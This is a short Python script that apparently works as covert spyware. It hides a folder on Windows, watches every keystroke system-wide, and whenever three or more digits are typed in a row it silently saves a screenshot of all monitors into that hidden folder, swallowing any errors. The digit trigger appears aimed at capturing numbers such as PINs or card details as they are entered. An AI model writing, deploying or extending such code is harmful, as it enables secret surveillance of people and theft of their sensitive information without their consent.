import os.path
import time
import uuid

import keyboard as keyboard
from mss import mss

numbers = [str(num) for num in range(0, 9)]
folder = os.path.join(os.path.curdir, ".hiddenleafvillage")


def __create_hidden_folder():
    if not os.path.exists(folder):
        os.mkdir(folder)
        if os.name == 'nt':
            import subprocess
            subprocess.check_call(["attrib", "+H", folder])


if __name__ == "__main__":
    __create_hidden_folder()
    count: int = 0
    while True:
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                if event.name.isdigit():
                    count += 1
                else:
                    count = 0
            if count > 2:
                time.sleep(0.2)
                with mss() as sct:
                    sct.shot(mon=-1, output=os.path.join(folder, str(uuid.uuid4()) + '.png'))
                count = 0
        except Exception as e:
            # print(e)
            pass
